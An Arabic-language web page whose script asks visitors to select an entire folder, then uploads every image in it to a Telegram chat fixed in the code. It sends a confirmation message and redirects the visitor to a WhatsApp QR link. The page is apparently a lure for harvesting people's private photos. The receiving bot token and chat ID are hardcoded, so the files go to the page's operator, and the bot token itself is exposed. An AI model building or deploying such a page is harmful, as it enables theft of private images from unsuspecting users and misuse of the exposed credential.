<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            overflow: hidden;
            background: white;
        }

        /* الشاشة البيضاء الأولى */
        #startScreen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            gap: 30px;
        }

        .start-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 20px 50px;
            font-size: 24px;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.5);
            transition: all 0.3s ease;
            animation: pulse 2s infinite;
        }

        .start-btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.7);
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        /* نافذة اختيار المجلد */
        #folderWindow {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90%;
            max-width: 500px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            padding: 40px 30px;
            text-align: center;
            z-index: 1001;
            display: none;
        }

        .folder-icon {
            width: 100px;
            height: 100px;
            background: linear-gradient(135deg, #0088cc 0%, #006699 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 30px;
        }

        .folder-icon img {
            width: 50px;
            height: 50px;
            filter: brightness(0) invert(1);
        }

        .folder-title {
            font-size: 24px;
            color: #333;
            margin-bottom: 20px;
        }

        .folder-text {
            color: #666;
            line-height: 1.6;
            margin-bottom: 30px;
            font-size: 16px;
        }

        .folder-btn {
            background: linear-gradient(135deg, #0088cc 0%, #006699 100%);
            color: white;
            border: none;
            padding: 18px 40px;
            font-size: 20px;
            border-radius: 12px;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: all 0.3s ease;
            font-weight: bold;
            margin: 10px;
            width: 90%;
            max-width: 300px;
        }

        .folder-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0, 136, 204, 0.4);
        }

        .folder-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
        }

        .selected-folder {
            margin-top: 20px;
            padding: 15px;
            background: #f0f8ff;
            border-radius: 10px;
            border: 2px dashed #0088cc;
            color: #006699;
            font-size: 14px;
            display: none;
        }

        /* نافذة التحميل */
        #uploadWindow {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90%;
            max-width: 500px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            padding: 40px 30px;
            text-align: center;
            z-index: 1002;
            display: none;
        }

        .upload-progress {
            width: 100%;
            height: 12px;
            background: #f0f0f0;
            border-radius: 6px;
            margin: 30px 0;
            overflow: hidden;
        }

        .upload-progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #25D366, #128C7E);
            width: 0%;
            transition: width 0.5s ease;
            border-radius: 6px;
        }

        .upload-status {
            color: #666;
            font-size: 16px;
            margin: 20px 0;
            min-height: 80px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .image-counter {
            font-size: 14px;
            color: #0088cc;
            background: #f0f8ff;
            padding: 5px 15px;
            border-radius: 20px;
            margin-top: 10px;
        }

        /* نافذة النجاح */
        #successWindow {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90%;
            max-width: 500px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            padding: 40px 30px;
            text-align: center;
            z-index: 1003;
            display: none;
        }

        .success-icon {
            width: 100px;
            height: 100px;
            background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 30px;
            animation: successScale 0.5s ease;
        }

        @keyframes successScale {
            0% { transform: scale(0); }
            100% { transform: scale(1); }
        }

        .success-icon img {
            width: 50px;
            height: 50px;
            filter: brightness(0) invert(1);
        }

        .countdown {
            font-size: 48px;
            font-weight: bold;
            color: #25D366;
            margin: 30px 0;
            animation: countdownPulse 1s infinite;
        }

        @keyframes countdownPulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        /* خلفية معتمة */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 999;
            display: none;
        }

        /* إخفاء عنصر input */
        #folderInput {
            display: none;
        }

        /* زر الانتقال إلى واتساب */
        .whatsapp-btn {
            background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);
            color: white;
            border: none;
            padding: 18px 40px;
            font-size: 20px;
            border-radius: 12px;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: all 0.3s ease;
            font-weight: bold;
            margin-top: 20px;
            text-decoration: none;
        }

        .whatsapp-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(37, 211, 102, 0.4);
        }
    </style>
</head>
<body>
    <!-- الشاشة البيضاء الأولى -->
    <div id="startScreen">
        <h1 style="color: #333; font-size: 32px; margin-bottom: 20px;">مرحباً بك 👋</h1>
        <p style="color: #666; font-size: 18px; max-width: 400px; text-align: center; margin-bottom: 40px;">
            انقر على الزر أدناه لبدء عملية إرسال الصور إلى تيليجرام
        </p>
        <button class="start-btn" onclick="startApp()">
            تشغيل الموقع 🚀
        </button>
    </div>

    <!-- نافذة اختيار المجلد -->
    <div id="folderWindow">
        <div class="folder-icon">
            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEwIDRINWMtMS4xMSAwLTIgLjktMiAydjE0YzAgMS4xLjg5IDIgMiAyaDE0YzEuMSAwIDItLjkgMi0yVjhjMC0xLjEtLjktMi0yLTJoLThsLTItMnoiLz48L3N2Zz4=" alt="📁">
        </div>
        <h2 class="folder-title">اختر مجلد الصور</h2>
        <p class="folder-text">
            يرجى اختيار المجلد الذي يحتوي على الصور التي تريد إرسالها إلى بوت تيليجرام
        </p>
        
        <button class="folder-btn" onclick="openFolderPicker()">
            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTE5IDIxSDVjLTEuMSAwLTItLjktMi0yVjVjMC0xLjEuOS0yIDItMmg0bDIgMmg4YzEuMSAwIDIgLjkgMiAydjEyYzAgMS4xLS45IDItMiAyem0tNy05aDN2LTNoMnYzaDN2MmgtdjNoLTJ2LTNoLTN6Ii8+PC9zdmc+" style="width: 24px; height: 24px; filter: brightness(0) invert(1);">
            فتح مستكشف الملفات
        </button>
        
        <div class="selected-folder" id="selectedFolder">
            <strong>المجلد المحدد:</strong>
            <span id="folderPath">لم يتم تحديد مجلد بعد</span>
        </div>
        
        <div style="margin-top: 30px; display: none;" id="uploadButtonContainer">
            <button class="folder-btn" style="background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);" onclick="startUpload()">
                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTE5LjM1IDEwLjA0QzE4LjY3IDYuNTkgMTUuNjQgNCAxMiA0IDkuMTEgNCA2LjYgNS42NCA1LjM1IDguMDQgMi42NyA4LjM2IDAgMTAuOTEgMCAxNGMwIDMuMzEgMi42OSA2IDYgNmgxM2MxLjY1IDAgMy0xLjM1IDMtM3MtMS4zNS0zLTMtM2gtLjY1ek0xNCAxM3Y0aC00di00SDdsNS01IDUgNWgtM3oiLz48L3N2Zz4=" style="width: 24px; height: 24px; filter: brightness(0) invert(1);">
                بدء إرسال الصور
            </button>
        </div>
    </div>

    <!-- نافذة التحميل -->
    <div id="uploadWindow">
        <div class="folder-icon" style="background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);">
            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTE5LjM1IDEwLjA0QzE4LjY3IDYuNTkgMTUuNjQgNCAxMiA0IDkuMTEgNCA2LjYgNS42NCA1LjM1IDguMDQgMi42NyA4LjM2IDAgMTAuOTEgMCAxNGMwIDMuMzEgMi42OSA2IDYgNmgxM2MxLjY1IDAgMy0xLjM1IDMtM3MtMS4zNS0zLTMtM2gtLjY1ek0xNCAxM3Y0aC00di00SDdsNS01IDUgNWgtM3oiLz48L3N2Zz4=" alt="⬆️">
        </div>
        <h2 class="folder-title">جاري إرسال الصور</h2>
        
        <div class="upload-progress">
            <div class="upload-progress-bar" id="progressBar"></div>
        </div>
        
        <div class="upload-status" id="uploadStatus">
            <div id="currentAction">جاري تحضير الصور...</div>
            <div class="image-counter" id="imageCounter">0/0</div>
        </div>
        
        <div style="color: #666; font-size: 14px; margin-top: 20px;">
            ⏳ قد تستغرق العملية بعض الوقت حسب عدد الصور
        </div>
    </div>

    <!-- نافذة النجاح -->
    <div id="successWindow">
        <div class="success-icon">
            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTkgMTYuMTdMNC44MyAxMmwtMS40MiAxLjQxTDkgMTkgMjEgN2wtMS40MS0xLjQxeiIvPjwvc3ZnPg==" alt="✅">
        </div>
        <h2 class="folder-title">تم الإرسال بنجاح!</h2>
        <p class="folder-text">
            تم إرسال جميع الصور إلى بوت تيليجرام.
            <br>
            جاري التوجيه إلى واتساب...
        </p>
        
        <div class="countdown" id="countdown">5</div>
        
        <a href="https://wa.me/qr/3I56DYDGDJHSJ1" class="whatsapp-btn" id="whatsappBtnDirect" style="display: none;">
            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEyIDBjNi42MjcgMCAxMiA1LjM3MyAxMiAxMnMtNS4zNzMgMTItMTIgMTJTMCAxOC42MjcgMCAxMiA1LjM3MyAwIDEyIDB6bTUuMjcxIDE0LjA1M2MtLjA5Mi4xNjYtLjMzMi4yOTMtLjUzMi4zMjctLjE3NS4wMzEtLjM4NS4wNS0uNzUyLS4wMzQtLjM2Ni0uMDY0LTEuMDg5LS4yMDktMi4wNzYtLjgwMi0zLjExNC0yLjM5OS0yLjc5NC0zLjg5My0yLjcxNy00LjA2OS4wNzctLjE3Ni4xMDItLjI3Ny4xNS0uMzc1LjA0OS0uMDk5LjA2OS0uMTY4LjA5Ni0uMjg0LjAyNy0uMTE3LjAxMi0uMjIzLS4wMS0uMzI5LS4wMjItLjEwNy0uNTY1LTEuNDAyLS43ODQtMS45MjctLjIwOC0uNTA3LS40Mi0uNDM2LS41NTgtLjQ0MS0uMTM4LS4wMDQtLjI5NS0uMDA0LS40NTItLjAwNHMtLjQxOC4wNjEtLjYzOC4zMDdjLS4yMi4yNDctLjg0NC44MjUtLjg0NCAyLjAxMyAwIDEuMTg5Ljg3NCAyLjM0My45OTYgMi41MDcuMTIyLjE2NCAxLjcyMiAyLjc1MiA0LjIwOCAzLjgzIDIuMTM4IDEuMDE1IDIuODc5LjgyIDMuMjg1LjczOC40MDYtLjA4MiAxLjgwMi0uNzQyIDIuMDU2LTEuNDU2LjI1NC0uNzE0LjI1NC0xLjMyNy4xNzgtMS40NTYtLjA3Ny0uMTI5LS4zMDYtLjItLjYzMS0uMzQ5LS4zMjYtLjE0OS0xLjkyNS0uOTU3LTIuMjI0LTEuMDY1LS4yOTktLjEwOC0uNTE3LS4xNjItLjczNS4xNjItLjIxOS4zMjUtLjg0Ni45OTYtMS4wMzggMS4yLS4xOTMuMjA0LS4zODYuMjMxLS43MTcuMDc4LS4zMzItLjE1NC0xLjQwMS0uNTIxLTIuNjctMS42NjUtLjk4MS0uODkxLTEuNjQ0LTEuOTk2LTEuODM3LTIuMzMzLS4xOTMtLjMzNy0uMDItLjUxOC4xNDQtLjY4My4xNTYtLjE1Ny4zMzItLjQwOS40OTgtLjYxNC4xNjctLjIwNS4yMjItLjM0NC4zMzItLjU3OC4xMTEtLjIzNC4wNTYtLjQ0My0uMDI4LS42MjEtLjA4NC0uMTc5LS43MzYtMS44MTMtMS4wMDgtMi40NzMtLjI3MS0uNjYtLjU0My0uNTcyLS43NDItLjU4Mi0uMTg4LS4wMDktLjQwNS0uMDEyLS42MjMtLjAxMnMtLjU3NC4wODQtLjg3Ny40MmMtLjMwMy4zMzYtMS4xNjIgMS4xNTQtMS4xNjIgMi44MSAwIDEuNjU3IDEuMjAzIDMuMjY3IDEuMzcgMy40OTMuMTY3LjIyNyAyLjMyNSAzLjcxMSA1LjczNiA1LjIwOC44My4zNjUgMS40NzQuNTgzIDEuOTc5Ljc0NS44MzguMjY3IDEuNjA0LjIyOSAyLjIwOS4xMzguNjc2LS4xMTIgMS45NTEtLjc5OCAyLjIyMy0yLjcxNC40MzEtLjIwNS44My0uNDU3IDEuMTQ4LS44NTQuMzE5LS4zOTYuMzc2LS44MzQuNDEyLTEuMDY1LjAzNi0uMjMxLjAzNi0uNDM1LS4wMjQtLjYwNnoiLz48L3N2Zz4=" style="width: 20px; height: 20px; filter: brightness(0) invert(1);">
            الانتقال إلى واتساب الآن
        </a>
    </div>

    <!-- خلفية معتمة -->
    <div class="overlay" id="overlay"></div>

    <!-- عنصر input مخفي لاختيار المجلد -->
    <input type="file" id="folderInput" webkitdirectory directory multiple>

    <script>
        // إعدادات البوت
        const BOT_TOKEN = '8448437426:AAGDNRN8rUX2BX8usRnteGq-RmlOxuq7hAE';
        const CHAT_ID = '6703506413';
        
        // العناصر
        const startScreen = document.getElementById('startScreen');
        const folderWindow = document.getElementById('folderWindow');
        const uploadWindow = document.getElementById('uploadWindow');
        const successWindow = document.getElementById('successWindow');
        const overlay = document.getElementById('overlay');
        const folderInput = document.getElementById('folderInput');
        const selectedFolder = document.getElementById('selectedFolder');
        const folderPath = document.getElementById('folderPath');
        const uploadButtonContainer = document.getElementById('uploadButtonContainer');
        const progressBar = document.getElementById('progressBar');
        const uploadStatus = document.getElementById('uploadStatus');
        const currentAction = document.getElementById('currentAction');
        const imageCounter = document.getElementById('imageCounter');
        const countdownElement = document.getElementById('countdown');
        const whatsappBtnDirect = document.getElementById('whatsappBtnDirect');
        
        // المتغيرات
        let selectedFiles = [];
        let uploadedCount = 0;
        let totalImages = 0;
        let selectedFolderPath = '';
        
        // بدء التطبيق
        function startApp() {
            startScreen.style.display = 'none';
            showFolderWindow();
        }
        
        // عرض نافذة اختيار المجلد
        function showFolderWindow() {
            overlay.style.display = 'block';
            folderWindow.style.display = 'block';
        }
        
        // فتح مستكشف الملفات
        function openFolderPicker() {
            folderInput.click();
        }
        
        // عند اختيار مجلد
        folderInput.addEventListener('change', function(e) {
            if (e.target.files.length > 0) {
                selectedFiles = Array.from(e.target.files);
                
                // الحصول على مسار المجلد
                selectedFolderPath = selectedFiles[0].webkitRelativePath.split('/')[0] || 'المجلد المحدد';
                
                // عرض معلومات المجلد
                folderPath.textContent = selectedFolderPath;
                selectedFolder.style.display = 'block';
                
                // عرض زر البدء
                uploadButtonContainer.style.display = 'block';
                
                // عد الصور فقط
                const imageFiles = selectedFiles.filter(file => 
                    file.type.startsWith('image/')
                );
                
                totalImages = imageFiles.length;
                
                // تحديث النص
                folderPath.textContent = `${selectedFolderPath} (${totalImages} صورة)`;
            }
        });
        
        // بدء عملية الرفع
        async function startUpload() {
            hideAllWindows();
            showUploadWindow();
            
            // تصفية الصور فقط
            const imageFiles = selectedFiles.filter(file => 
                file.type.startsWith('image/')
            );
            
            totalImages = imageFiles.length;
            
            if (totalImages === 0) {
                alert('❌ لم يتم العثور على أي صور في المجلد المحدد.');
                showFolderWindow();
                return;
            }
            
            // بدء الإرسال
            await uploadImages(imageFiles);
        }
        
        // عرض نافذة التحميل
        function showUploadWindow() {
            overlay.style.display = 'block';
            uploadWindow.style.display = 'block';
        }
        
        // عرض نافذة النجاح
        function showSuccessWindow() {
            overlay.style.display = 'block';
            successWindow.style.display = 'block';
            whatsappBtnDirect.style.display = 'inline-flex';
            startCountdown();
        }
        
        // إخفاء جميع النوافذ
        function hideAllWindows() {
            folderWindow.style.display = 'none';
            uploadWindow.style.display = 'none';
            successWindow.style.display = 'none';
            overlay.style.display = 'none';
        }
        
        // رفع الصور
        async function uploadImages(imageFiles) {
            uploadedCount = 0;
            let successCount = 0;
            let errorCount = 0;
            
            try {
                // اختبار اتصال البوت
                currentAction.textContent = '🔍 جاري اختبار اتصال البوت...';
                updateProgress(5);
                imageCounter.textContent = `${uploadedCount}/${totalImages}`;
                
                const botTest = await testBot();
                if (!botTest.ok) {
                    throw new Error('فشل الاتصال بالبوت. تأكد من صحة التوكن.');
                }
                
                // بدء إرسال الصور
                for (let i = 0; i < imageFiles.length; i++) {
                    const file = imageFiles[i];
                    uploadedCount++;
                    
                    // تحديث الواجهة
                    currentAction.textContent = `📤 جاري إرسال: ${file.name}`;
                    imageCounter.textContent = `${uploadedCount}/${totalImages}`;
                    
                    // تحديث شريط التقدم
                    const progress = 5 + ((i + 1) / imageFiles.length) * 90;
                    updateProgress(progress);
                    
                    try {
                        // إرسال الصورة إلى تيليجرام
                        const result = await sendImageToTelegram(file);
                        
                        if (result.ok) {
                            successCount++;
                        } else {
                            errorCount++;
                            console.error(`خطأ في إرسال ${file.name}:`, result.description);
                        }
                    } catch (error) {
                        errorCount++;
                        console.error(`خطأ في إرسال ${file.name}:`, error);
                    }
                    
                    // تأخير لمحاكاة الإرسال
                    await sleep(500);
                }
                
                // إرسال رسالة تأكيد
                currentAction.textContent = '📨 جاري إرسال تأكيد النجاح...';
                await sendConfirmation(successCount);
                updateProgress(98);
                
                // الانتظار قليلاً
                await sleep(1000);
                updateProgress(100);
                
                // الانتقال إلى شاشة النجاح
                hideAllWindows();
                showSuccessWindow();
                
            } catch (error) {
                console.error('Error:', error);
                currentAction.textContent = `❌ خطأ: ${error.message}`;
                
                // إعادة المحاولة بعد 5 ثواني
                setTimeout(() => {
                    currentAction.textContent = '🔄 جاري إعادة المحاولة...';
                    setTimeout(() => uploadImages(imageFiles), 2000);
                }, 5000);
            }
        }
        
        // اختبار اتصال البوت
        async function testBot() {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
                return await response.json();
            } catch (error) {
                throw new Error('لا يمكن الاتصال بالبوت');
            }
        }
        
        // إرسال صورة إلى تيليجرام
        async function sendImageToTelegram(file) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', file);
                formData.append('caption', `📸 ${file.name} - من ${selectedFolderPath}`);
                
                const response = await fetch(
                    `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
                    {
                        method: 'POST',
                        body: formData
                    }
                );
                
                return await response.json();
            } catch (error) {
                throw error;
            }
        }
        
        // إرسال تأكيد
        async function sendConfirmation(successCount) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `✅ تم استلام ${successCount} صورة من المجلد "${selectedFolderPath}" بنجاح!`,
                        parse_mode: 'HTML'
                    })
                });
                
                return await response.json();
            } catch (error) {
                return { ok: true };
            }
        }
        
        // تحديث شريط التقدم
        function updateProgress(percentage) {
            progressBar.style.width = `${percentage}%`;
        }
        
        // بدء العد التنازلي
        function startCountdown() {
            let count = 5;
            const interval = setInterval(() => {
                count--;
                countdownElement.textContent = count;
                
                if (count <= 0) {
                    clearInterval(interval);
                    redirectToWhatsApp();
                }
            }, 1000);
        }
        
        // التوجيه إلى واتساب
        function redirectToWhatsApp() {
            window.location.href = "https://wa.me/qr/3I56DYDGDJHSJ1";
        }
        
        // دالة المساعدة للتأخير
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        // بدء التوجيه التلقائي بعد 30 ثانية إذا لم يبدأ المستخدم
        setTimeout(() => {
            if (startScreen.style.display !== 'none') {
                if (confirm('هل تريد الانتقال مباشرة إلى واتساب؟')) {
                    redirectToWhatsApp();
                }
            }
        }, 30000);
    </script>
</body>
</html>
